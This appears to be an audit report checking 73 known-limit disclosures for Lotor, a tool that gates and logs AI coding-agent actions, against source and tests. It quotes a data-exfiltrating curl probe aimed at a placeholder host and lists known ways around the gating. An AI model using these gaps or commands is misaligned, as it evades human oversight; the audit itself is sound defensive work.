# Known-limits audit evidence — 2026-09-08

Final reviewed source commit: `fa8d1a996f3bc4720c549917e64ce635c19d35d7`.
After the current-reading guide, manual restamp and read-only shipped-log test,
`npm test` passed 1,053 tests in 178 suites, with zero failures or skips.
The same shipped-log test failed against baseline `1720aa1` without changing its
log; its stored body digest differed from its actual committed body. The final
default `limits-pin --check` reports that the log matches the source checkout.
The path fixes preserve native protected-path interpretations before considering
portable separators. They do not add symlink confinement or execution-time
binding; those remain separate limits.

This records the pre-amendment findings that motivated the current-reading guide in KNOWN-LIMITS.md. References to contradictions describe the text before that guide was added. Baseline source: `1720aa1d8662e62b0b0f136a754533a6cd3ece01`. Subsequent portability changes and the final pin are described in the pull request. Tests establish fixture behavior, not private historical events. Local diagnostic filenames below identify the audit run; they are not distributed runtime dependencies.

# Lotor disclosure audit: entries 1–35

Audit date: 2026-09-08. Code reviewed at HEAD `1720aa1d8662e62b0b0f136a754533a6cd3ece01` in `the repository checkout`. Read `CLAUDE.md`. No code, disclosure, approval state, or pin was changed by this audit. The parent is concurrently editing the pin CLI and tests; entry 29 below describes HEAD's behavior, not a verification of that unfinished change.

**This audit does not justify stamping the existing text unchanged.** Entries 2, 11, 19, 21, 29, 30 and 31 contain materially stale current-behavior claims. Entries 12, 13 and 27 need version/history clarification. Existing dated amendments were read; a historical opening contradicted by its own clear amendment is not treated as an unfixed defect merely because its title is old.

Status means: **verified** = current architectural/mechanical claim supported by inspected implementation (and named tests where available); **contradicted** = at least one present-tense or forward-looking claim differs from implementation; **unverified** = insufficient local evidence. Historical live counts, dates, prices, external harness behavior and operator incidents are not independently authenticated by passing fixture tests. No claim below certifies them.

All source and test paths below are relative to the exact repository root above. Function names and line numbers identify inspected evidence; line numbers precede any parent edits.

| Entry | Status | Current evidence and qualification |
|---|---|---|
| 1 | verified | `src/chain/index.js:27–53,106–173` signs supplied payloads and checks hashes/signatures/linkage; `src/parser/index.js:14–27` accepts locally supplied JSONL. No independent capture-completeness check occurs. `test/chain.test.js` passes tamper tests. This verifies the limitation, not truth of the captured payload. |
| 2 | contradicted | The non-wire capture limitation and shared matcher are true: `bin/hook-post-tool-use.js` `matchEgress()` and `main()` accept tool payload/response and select egress. But the final paragraph's exact `curl https://host/collect?data=...` example **is detected now**: `src/policy/index.js:916–965` `hasDataCarryingQuery()`, called by `isEgressOther()`. `test/egress-query-string.test.js` passes sensitive-name, long-payload, ordinary-read and localhost controls. Pure probe `curl https://host/collect?data=abc` returned egress=true. Residual: heuristic query detection remains incomplete; short values under innocuous names and presign-named parameters can remain unseen. |
| 3 | verified | `src/store/index.js` persists local keys/chain; `src/chain/index.js` verifies only supplied entries/key. `bin/export-chain.js:100–146` verifies an exported bundle against its included key, not an external timestamp/notary. No network anchoring path found in inspected `src/` inventory or chain/store/export implementation. External anchoring described as a future plan cannot be authenticated from code. |
| 4 | verified | `src/parser/index.js:43–49,87–115,265` records token fields and `note: 'tokens only; no USD in source'`; inspected source inventory contains no bundled price table. `test/parser-by-model.test.js` verifies token accounting. Dates and the cited old-tree re-verification remain historical assertions. |
| 5 | verified | `src/ingest/index.js:87–108` appends initial subsession 0, skips when parsed transcript entry count does not exceed the previous maximum, and uses existing receipt count as next index. Each parse consumes the whole supplied transcript. `test/subsessions.test.js` passes duplicate/growth/concurrency and receipt-vs-session count cases. Qualify “new activity”: the actual guard is transcript-entry growth; equal-size revisions are not distinguished. Hook firing frequency is external harness behavior, not proven by these tests. |
| 6 | verified | Four standalone hook scripts call chain/store paths; package `bin` entries install the MCP server without registering hooks. `README.md:64–71,107–145` specifies separate manual hook registration. `test/hook-post-tool-use.test.js`, `test/hook-session-start.test.js`, `test/hook-session-end.test.js` verify hook receipt writes in isolated homes. Installing alone does not prove any host invokes those hooks; manual MCP writes also require an explicit action. |
| 7 | verified | `src/store/lock.js:28–34,145–185` has 5000ms bounded retry and throws on exhaustion. `bin/hook-session-end.js:127–150` catches ingest failures, reports stderr and exits 0 with no retry queue. `src/store/index.js` appends inside the lock. Failure/exit behavior tested in `test/hook-session-end.test.js`; no fresh 5-second contention-drop experiment run. |
| 8 | verified | `src/store/index.js:35–73` reads/writes plaintext PEM `keys/chain.key`, write mode 0600. `src/gate/sign.js:99–168` derives approval key from passphrase and writes only public key. `src/chain/index.js` verifies against chain public key, so private-key possession permits new valid entries. Actual filesystem permissions and key custody on the owner's live machine were not inspected. |
| 9 | verified | Read as amended: portable bundle workflow exists. `bin/export-chain.js:65–95` exports public key plus entries; `:100–146` imports only supplied public key, verifies and prints capture/tail caveats. `src/store/index.js:35–73` still creates independent local keypairs. No live 640-entry export or other-machine round trip repeated. |
| 10 | verified | `src/gate/sign.js:14–17,109,164` uses PBKDF2 600000/SHA-256, 32-byte seed and literal fixed salt. No per-install random salt in derivation. This directly supports same-passphrase/same-key and shared precomputation limitations. |
| 11 | contradicted | Pattern/evasion and fail-open limits remain (`src/policy/index.js` matchers; `bin/hook-pre-tool-use.js:789–820,1019+` errors). The paragraph saying bare or variable-ref protected pushes flow free is stale: `src/policy/index.js:804–819,1596–1600` handles implicit targets, `src/policy/git-context.js` resolves git state, and hook `:789–805` supplies context. `test/push-implicit-protected.test.js` passes bare main, variable ref, unresolved context and safe controls. Host registration-between-sessions timing is not independently measured. |
| 12 | contradicted | Dedup mechanism remains verified (`src/parser/index.js:85–115,293–300`; `test/parser-dedup.test.js`). But “receipts written from this point forward carry cost/2” is stale: parser `:265` emits **cost/4**. Amend as historical schema progression, preserving warning about receipts lacking a schema. Historical 2.083/2.035 inflation ratios and “every pre-fix receipt” were not re-measured. |
| 13 | contradicted | Per-model accounting and declared/inferred/unknown harness behavior are built as amended: `src/parser/index.js:99–115`, `src/harness.js:92–144`, `bin/hook-session-start.js:355–380`; `test/parser-by-model.test.js` and `test/harness.test.js` pass. Harness remains session-open metadata, not cost-by-harness. The current schema is cost/4, not the amendment's cost/3. Also clarify “no sum across buckets is produced”: `src/parser/index.js:92–95` still computes flat mixed-model totals; the later paragraph correctly acknowledges those totals. No separate second total is derived from the buckets, but wording can imply no blended figure exists. |
| 14 | verified | `bin/hook-session-start.js:322–380` anchors session/policy/head/registration/harness; `src/views/index.js:114–145,296–311` distinguishes opens/unclosed and absence of opens. `test/hook-session-start.test.js` passes open-without-close, closed, zero-open and chain checks. Open records do not capture later crash work; host hook registration remains prerequisite. |
| 15 | verified | Read as corrected: hook `parsePayload()` retains permission mode; `bin/hook-pre-tool-use.js:744–785` warns/records both-layers-permissive once per session. `test/hook-permissive-posture.test.js` passes permissive/acceptEdits/mode/dedup cases. The claim that a host always invokes hooks irrespective of permission mode is external and was not tested against a running harness. |
| 16 | verified | Read as amended: `src/gate/index.js:70–115` imposes 60-minute age and 120-second future tolerance; `test/approval-token-freshness.test.js` passes all 7 cases. `src/gate/sign.js:299–317` scans/appends plain nonce log; missing log means nonce unused. No bounded-log pruning or trusted-clock path exists there. |
| 17 | verified | `src/grant/verify.js:106–177` checks signature, exact session, expiry, shared usage ceiling and canonical request equality; `src/grant/check.js:90–96` counts chain uses. `test/grant-verify.test.js` and `test/grant-concurrency.test.js` pass. Exact equality does not inspect effects of repeated approved command execution. |
| 18 | verified | `src/grant/issue.js:232–245` explicitly places `requests: grant.requests` onto chain with signature and bounds; `test/grant-record.test.js` verifies full request preservation. General claim that other entry types are mostly digests is descriptive, not a guarantee that all other payloads omit plaintext. |
| 19 | contradicted | Expiry/ceiling/file-removal mechanics true: `src/grant/check.js:59–87` loads existing grant files; verifier applies limits, and no revoke CLI found in `src/grant` or package scripts. But blanket “Deleting requires no signature” is false for shell tool deletion: `src/policy/index.js:668–688` gates any command naming Lotor home. Pure `isSelfMod` probe for `rm /tmp/lotor-audit-home/grants/example.json` with that base returned true. Direct filesystem deletion outside the hook still needs no cryptographic authorization. Distinguish capability removal from the tool-layer gate. |
| 20 | verified | `src/grant/verify.js:131–154` compares caller-provided now with expiry; `bin/hook-pre-tool-use.js:887–909` supplies Date.now(), checks and appends grant-use in `appendReceiptGuarded`. `test/grant-concurrency.test.js` passes exactly 2 approvals from 6 synchronized candidates. Logical bound remains dependent on integrity/completeness of local usage history (#22). |
| 21 | contradicted | Enumerated repaired command-tool/core/opaque/destructive/egress/grant behaviors have source and passing focused tests (`test/policy-command-tools.test.js`, `test/selfmod-covers-core.test.js`, `test/policy-destructive-dotdot.test.js`, `test/grant-concurrency.test.js`, `test/policy-gh-and-prose.test.js`). But “prose naming a protected path” in commit messages/heredocs is no longer a blanket remaining over-gate: `matchableCommand()` strips inert prose, as #26 explains. Pure protected-path commit-message and quoted cat-heredoc probes returned selfMod=false. Read commands naming real core files still gate; unsupported prose consumers/expansions can still trigger. |
| 22 | verified | `src/chain/index.js:106–173` verifies hashes/signatures/genesis/links and accepts an empty chain or valid prefix; no expected-tail anchor checked. `test/chain.test.js` verifies alteration/head-link behavior. `src/store/index.js` resumes from loaded length. `src/policy/index.js:648–688` protects chain basename/home spellings, not arbitrary direct filesystem access. No external evidence of actual tail deletion examined. |
| 23 | verified | `src/policy/index.js:441–505,648–664` uses generic core fragments independent of actual source checkout; pure `cat ./src/store/model.js` selfMod=true. Pure `ls ./src/chain/` selfMod=false. `test/policy-selfmod-separator-spellings.test.js` passes the remaining bare-directory/trailing-slash tripwires. |
| 24 | verified | `src/policy/index.js` `destructiveAllowlisted()` resolves lexical dot segments then accepts any scratch-named segment; rm trigger/target scanning and git-clean pathspec handling are implemented. `test/policy-destructive-dotdot.test.js` and `test/policy-destructive-flag-order-git-clean.test.js` pass. Amendment's “-x <pattern> takes a value” wording is code-specific and should not be read as an independently verified statement of git CLI semantics. No destructive command was executed by audit. |
| 25 | verified | `src/policy/index.js` `usesAuthedRemoteClient()` uses short read allowlist and defaults remaining gh actions to mutating; `isPublish()` keeps specific publish actions separate. `test/policy-gh-and-prose.test.js` passes unknown future subcommand, gh api, mutating verbs, read controls and gh.exe. Other authenticated binaries remain unclassified unless another matcher hits. Live historical repository mutation not repeated. |
| 26 | verified | `src/policy/index.js:314–431` strips selected message/heredoc prose and preserves executable expansion/pipeline/interpreter regions. `test/policy-gh-and-prose.test.js` passes positive and negative cases, including double-quote substitutions. `printf` is not a prose-consumer exemption. “None [regex parsing evasions] is known” is historical knowledge, not a completeness property this audit proves; persistence writes are now partly covered by #31/#44 improvements. |
| 27 | contradicted | Exact canonical command binding verified (`src/gate/sign.js:285`, `src/gate/index.js:119+`; `test/params-canonical.test.js`). Variant detection exists in shipped HEAD hook `:414–466,542+`, with `test/denial-enrichment.test.js` passing. Its amendment's “built, though not shipped” / absent-from-release wording needs a current note (entry 29 separately records the merge). Residual byte-identical exclusion and newest-25 bound remain in `:437–453`; staging requests have no pruning path. Historical branch/release assertions not independently reconstructed. |
| 28 | verified | `src/grant/verify.js:126–129` requires exact sessionId; test rejects mismatches. No reusable scheduled-task identity or operator-away/overnight state exists in grant schema/check path. Thus a single grant cannot cover multiple distinct session IDs. Scheduler/session behavior outside Lotor is an assumption, and the unconditional prose “inherently gated cannot be automated at all” should be scoped to needing a fresh unsatisfied approval under this grant model. |
| 29 | contradicted | HEAD CLI `bin/limits-pin.js:41–65` pins **last src/ commit**, not checkout HEAD as the older “Fixed” amendment says; `src/limits/pin.js:180–245` additionally checks body digest. Package `test` is still `node --test`, not a direct shipped-log truth check. Parent is fixing mutation/isolation; this audit deliberately did not run the old tracked-file-mutation tests. Current 2026-09-07 pin is not the historical 2026-08-23 pin named in the Sept 1 incident. Preserve incident history but add current mechanism/state and audit scope before any stamp. A matching pin alone cannot verify these 35 entries. |
| 30 | contradicted | The suggested “delete every remaining token for a path once one is spent” repair is implemented: `src/gate/index.js:180–209,294–307` purges canonical-request siblings under nonce lock. `test/gated-action-token-purge.test.js` passes same-file purge, unrelated request retention and malformed-file handling. Latest amendment only acknowledges expiry/ledger, leaving this closure missing. Residual path-only binding still true (`bin/hook-pre-tool-use.js:848–857`); purge is best-effort and does not retroactively bind content. #73 acknowledges the purge elsewhere. “Unspent files are by construction valid/non-expiring” is historical and no longer true. Token CLI also has cleanup `bin/tokens.js:131–145`; shell invocation/file deletion may itself gate because bin/home is protected. |
| 31 | contradicted | “There is no rule” / “Not fixed in v1” is obsolete. `src/policy/index.js:1280–1405` models scheduling verbs and persistence artifact paths; `evaluate()` dispatches Edit/Write and command scope-escalation. `test/policy-scheduled-task.test.js` passes scheduled task/job, at, launchd, systemd timer, cron and file-path cases with controls. Residual wrapper/unknown surface blindness remains; do not claim all persistence is detected. No live scheduler registrations examined or performed. |
| 32 | verified | `bin/hook-pre-tool-use.js:337–377` stages action request and optional purpose/stagedAt sidecar, not ruleId. `bin/tokens.js:104–123,180+` displays request action/details/age/status, no rule field. RuleId on later gate receipt is not a ledger sidecar. No rules sidecar writer/reader found. |
| 33 | verified | Gate accepts the exact signed request; it does not rewrite approved commands or sanitize their executable substitutions (`src/gate/index.js:84–151,223–350`). `test/policy-gh-and-prose.test.js:141–151` confirms substitutions remain visible to matchers, not blocked irrespective of approval. Shell execution itself is host behavior and was not executed for this audit. Historical unsafe commit incident unverified. |
| 34 | verified | `src/policy/index.js:508–550` still dispatches Edit/Write/NotebookEdit by path fragments/bin regex; does not call `classifyPath`. `src/grant/core-paths.js` performs lexical path resolution/containment for grantability. `test/selfmod-covers-core.test.js` guards enumerated list alignment, not automatic classification of future directories. This is lexical containment, not proof against all symlink/filesystem aliases. |
| 35 | verified | Read top CLOSED notice as authoritative over retained older narrowed notes. All four gated-action payload shapes carry `sessionId: meta.sessionId || null` (`src/gate/index.js:240,277,318,340`); hook passes it at `:932,958,995`. `test/known-limits-35-session-attribution.test.js` passes 5 tests, including both dynamic outcome paths, null absence and static four-site/three-site assertions. Informational meta stays outside canonical approval request. Legacy entries cannot acquire attribution; no attempt to infer by timestamp. |

## Executed verification

First focused run: 223 tests, 32 suites, **223 passed / 0 failed / 0 skipped**, exit 0. Files: `egress-query-string`, `push-implicit-protected`, `gated-action-token-purge`, `policy-scheduled-task`, `known-limits-35-session-attribution`, `approval-token-freshness`, `parser-dedup`, `parser-by-model`, `harness`, `subsessions`, `grant-concurrency`, `policy-gh-and-prose`, `policy-destructive-flag-order-git-clean`, `policy-command-tools`, `selfmod-covers-core`, `chain` (all under `test/`, suffix `.test.js`).

Second focused run: 107 tests, 22 suites, **107 passed / 0 failed / 0 skipped**, exit 0. Files: `hook-post-tool-use`, `hook-session-start`, `hook-permissive-posture`, `hook-session-end`, `grant-verify`, `grant-record`, `policy-destructive-dotdot`, `policy-selfmod-separator-spellings`, `denial-enrichment`, `params-canonical`. Output retained at `lotor-audit-1-35-tests-additional.log`.

Pure matcher probes (no corresponding commands executed): grant-file shell deletion was self-mod=true; inert commit message mentioning `src/gate/index.js` false; quoted cat heredoc mentioning it false; real `cat ./src/store/model.js` true; directory-only `ls ./src/chain/` false; query-data curl egress=true.

## Audit limits and stamp recommendation

330 passing tests establish their fixture behavior, not the truth of historical incidents, real receipt counts, deployed harness coverage, cryptographic key custody, release dates, or absence of every evasion. Sources outside this repository cited by the disclosure were not consulted. Source-only negative claims are bounded to inspected implementations/inventory. Entries 36–73 are outside this assignment. No stamp was applied. Amend contradicted current text and reconcile the other audit slice before deciding whether a new pin truthfully describes the resulting tree.


---

# Lotor disclosure audit, entries 36–73

Checked 2026-09-08 against the source currently checked out in `lotor-work`.
This is a source and regression-test audit of current behavior. It does not
authenticate the operator's private historical sessions, signing ceremonies,
private transcripts, or external tooling. A fresh pin must not imply those
events have been independently reproduced.

The complete suite executed 1,050 tests: 1,047 passed, three failed. An archive
of unmodified HEAD reproduces all three failures in the 35-test portability
subset. Logs: `lotor-full-test.log`, `lotor-baseline-portability.log`.

| Entry | Current assessment | Evidence / required clarification |
|---|---|---|
| 36 | Latest amendment supported | `src/views/autograph.js` matches action plus canonical digest and counts confirmed/ambiguous/unmatched. `test/autograph.test.js` and `test/limit-36-digest-attribution.test.js` passed. Earlier no-match claims are historical. |
| 37 | Core behavior supported; private row examples unverified | `src/chain/index.js:createChain.append` accepts arbitrary payload; no type whitelist. External `ledger-head` entries and authorship cannot be independently verified from the local repository. |
| 38 | Reconciliation behavior supported; universal impossibility claim stale | `src/views/reconcile.js` preserves exact/suffix distinction and ambiguity, and declares command items unreconcilable within this view. Candidate command attribution is now possible through the digest path in entry36; statements that nothing in the chain can compare any command candidate are too broad. `test/reconcile.test.js` passed. |
| 39 | Derived output supported; residual target claim stale | `deviationNote` derives its numeric sentence and uses four evidence categories. Its current output says receipts carry parameter digests. The entry's assertion that a gate receipt never records a target should distinguish plaintext targets from candidate-verifiable digests. |
| 40 | Historical automated authorship unverified | Repository history can show the documentation PR but cannot prove whether an interactive human directed its creation. The entry explicitly places the scheduled producer outside ordinary repo code. No current-code guarantee against quota incentives exists. |
| 41 | Latest mitigation and stated exclusions supported | `src/mcp/build-identity.js` recursively hashes `.js` source under `src` and `bin`, excludes dependencies, records start metadata and compares current disk. `src/mcp/server.js` attaches build metadata. Build identity/MCP tests passed. Hashing disk is a proxy for loaded modules. |
| 42 | Supported | `src/gate/index.js:288–307` records nonce consumption before returning approval; the PreToolUse hook does not await the target command outcome. Historical failed push remains first-party testimony. |
| 43 | Partly stale | File-only canonical requests and per-action friction remain. The old banking description predates surplus purge, now covered accurately by entry73. Request-description availability is controlled by harness input, not guaranteed by repository code. |
| 44 | Latest bounded closure supported | Scheduled-task test suite passes the newer time formats and systemd separator variants. Explicit residuals still delimit the claimed closure; historical 'nothing fires' paragraphs must be read as history. |
| 45 | Supported | `bin/pap-export.js:52` requires `--public`; the spine is encoded without content classification. `src/publish/pack.js` compresses and signs the supplied bytes. |
| 46 | Cryptographic scope supported | `pack` signs manifest bytes; `unpack` verifies then decompresses. This verifies integrity under a key, not usefulness or safe content. PAP tests passed. |
| 47 | Availability limit supported; integrity wording needs scope | Manifest carries a head hash and optional memoir URL. The pack/unpack path does not fetch the URL or establish that arbitrary fetched memoir content corresponds to the hash. Integrity checking is possible for a corresponding verifiable chain bundle, not guaranteed for any URL contents. |
| 48 | Supported for default export | `bin/pap-export.js:78–87` obtains the chain key through `loadOrCreateKeyPair`; optional supplied key path also exists. No mandatory approval-key co-signature. |
| 49 | Supported | `bin/pap-export.js` reads the spine, checks acknowledgment and encodes; no private-data scanner in this path. |
| 50 | Supported | `src/parser/index.js:166–180,319–384` carries 16-hex insertion-order digest beside full canonical digest. Input correlation id is copied data, not authenticated origin. Parser/interop tests passed. |
| 51 | Forward schema supported; old receipts not audited | Current gate emits enriched decisions. Historical private chain rows cannot be checked here. Absence is insufficient to prove a receipt's creation date if another writer supplied a partial payload (entry37). 'Absent means pre-seam' should be scoped to this writer/version history. |
| 52 | Mechanism supported; live harness assertion unverified | `src/toolpins/tool-pin.js` compares supplied listings and treats scheme changes as rebaselines. It is called from session-open. Tests passed. What the owner's current harness actually supplies requires an actual payload. |
| 53 | Supported with updated file scope | A digest is not a semantic diff. Current matcher schema is `matcher/2`; wider build identity is also now recorded. |
| 54 | Supported | Parser adds `thinkingBlocks` only when encountering thinking blocks. It hashes emitted text rather than observing hidden computation. Thought-capture/parser tests passed. |
| 55 | Supported | `src/parser/index.js:277` hashes transcript bytes, not an independent source of all session events. A cooperating transcript writer can omit data before hashing. |
| 56 | Supported | `hasDataCarryingQuery` matches sensitive names/payload shapes and exempts presigned prefixes; query/localhost tests passed. Chunking and unknown encodings remain outside a text heuristic. |
| 57 | Supported with historical timing unverified | Git context resolution and implicit protected push tests pass. Effective shell cwd and shell-variable interpretation remain outside resolver semantics. The quoted 15–40ms measurement was not reproduced as a performance guarantee. |
| 58 | Supported | `expandBraces` defaults to4096; overflow gates and dedicated overflow tests passed. Textual expansion does not execute shell semantics. |
| 59 | Supported on native paths; portability exception measured | Header classification resolves a path and reads four bytes, closes fd before execution; missing target returns null. Current Windows-spelling test fails on POSIX because backslashes reach native `path.resolve`. Other seven extensionless tests pass. |
| 60 | Supported | Ingest computes sidecar digest, appends receipt, then writes sidecar (`src/ingest/index.js:43–56,87,115–128`). Crash window and self-reported usage remain. Sidecar tests passed. |
| 61 | Supported, still open | `bin/hook-pre-tool-use.js:756–757` still says neither layer stops anything in loose; self-mod/mode-change remain gated. SessionStart has another overbroad loose warning at313. |
| 62 | Latest bounded closure supported | Separator-spelling tests pass; bare-directory cases intentionally remain free under entry72. Trailing-dot Windows execution was not tested on this Mac. |
| 63 | Latest bounded closure supported | `MATCHER_SCHEMA='matcher/2'`, `matcherHashInputs` supplies named deciders. Coverage tests passed. No claim that dependency or whole-system behavior is fully covered. |
| 64 | Top status supported; final chronological paragraph misleading | Current hook imports and CALLS `buildIdentityAtOpen` in observer/2 (`bin/hook-session-start.js:378`), and real-hook tests passed. Final NARROWED paragraph describes the earlier partial state; add a final status clarification after it. |
| 65 | Mechanism supported; committed body digest is stale | Body-digest tests pass and no-digest pins retain legacy semantics. At baseline `1720aa1`, the 2026-09-07 pin names the matching last-source commit `e8415ed`, but records body SHA-256 `b90d7acf87f022e2af27fa5b953cc5f895e6b64c5dd5b3910f988b7844d8f013`; the committed body hashes to `6f68e728d838dcfc026982431387920c0630a1b2a5881ec3dc6773f67218c5b2`, so `checkPin` reports edited. `npm test` had CLI tests but not a read-only committed-pin freshness assertion. |
| 66 | Recording absence now overstated; enforcement residual supported | `src/ingest/index.js:61–72` includes `summarizeSubagents` when a sidecar exists. This records child summaries after the fact; it does not intercept child tools or add per-tool gate decisions. Historical 3,962/519 counts require unavailable private transcripts. |
| 67 | Unverified historical observation | The three notified totals and corresponding transcript contents are not provided here. Arithmetic written in the entry is checkable, but the provenance of those inputs is not. Current in-repo subagent reader sums transcript usage; it does not validate harness notifications. |
| 68 | External historical program unverified; in-repo replacement narrows absence | `src/ingest/subagents.js:collectSubagents` distinguishes absent directory from present-empty; `summarizeSubagents` returns null for absence. It still relies on a path convention and has no harness-version check. The external Python reader is absent. |
| 69 | Historical dollar figures unverified; current implementation uses no rates | `summarizeSubagents` sums tokens and optionally forwards a price-table date. It computes no dollars. The external price table and trace-bridge source are unavailable here. |
| 70 | Enforcement gap consistent with code; numerical examples unverified | Post-session subagent summarization does not route child calls through PreToolUse. Private 51/9/519 counts and their dates cannot be independently reproduced. Reading/capturing and enforcement must remain separate claims. |
| 71 | Latest amendment supported | Ingest writes chapter count/digest excluding titles; chapters view verifies it. Real CLI tests pass. Codex parsing remains a format heuristic and no Codex end-session writer is present. |
| 72 | Supported, still open | Dedicated tripwire passes: bare protected directories remain unmatched; file-level control gates. This audit did not perform destructive shell operations. |
| 73 | Mechanism supported; private signing counts unverified | `purgeSurplusTokens` deletes sibling requests with identical canonical request inside the consumption lock. Entry30 tests confirm purge. Historical signing-sitting table is first-party testimony. |

## Stamping decision

Do not stamp the current file as wholly independently verified. Correct current
overstatements above, identify historical/private evidence as such, and explicitly
define any stamp as a verification of the disclosed current code behavior against
the named source tree, not authentication of every private event. The audit also
exposes three pre-existing suite failures that the strict paid condition requires
resolving or receiving an explicit scope decision about.
